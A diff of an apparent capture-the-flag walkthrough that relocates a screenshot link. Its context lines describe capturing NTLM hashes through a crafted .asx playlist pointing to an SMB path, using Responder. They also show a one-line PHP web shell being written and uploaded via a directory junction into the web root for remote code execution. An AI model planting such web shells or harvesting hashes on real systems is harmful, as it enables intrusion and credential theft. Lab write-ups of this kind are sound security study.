@@ -147,6 +147,7 @@ An `.asx` file is not a video — it's an XML-based *playlist/redirector* that t
 That's the whole trick: the vulnerability isn't in the web app's code at all — it's in the fact that Windows will silently attempt NTLM authentication to *any* SMB path a file references, and the web app was kind enough to accept a file format that can embed one. We can capture this NTLM hash with Responder.
 
 ### Creating the Malicious .asx File
+![Web Shell Delivered via Junction](POC/Files_created.png)
 
 The malicious file itself is a small, easy-to-read XML document — nothing about it looks obviously malicious to a human reviewer, which is exactly the problem:
 
@@ -390,7 +391,6 @@ hyena@hyena$ echo '<?php system($_GET["cmd"]); ?>' > cmd.php
 
 Upload `cmd.php` through the website with the same form values used for the junction (`test` / `test` / `test@test.null`), since the extension whitelist on the upload form is irrelevant once the junction is in place — the app still thinks it's writing to an isolated per-applicant folder, unaware it just dropped an executable PHP file straight into the document root.
 
-![Web Shell Delivered via Junction](POC/Files_created.png)
 
 ### Testing RCE
 
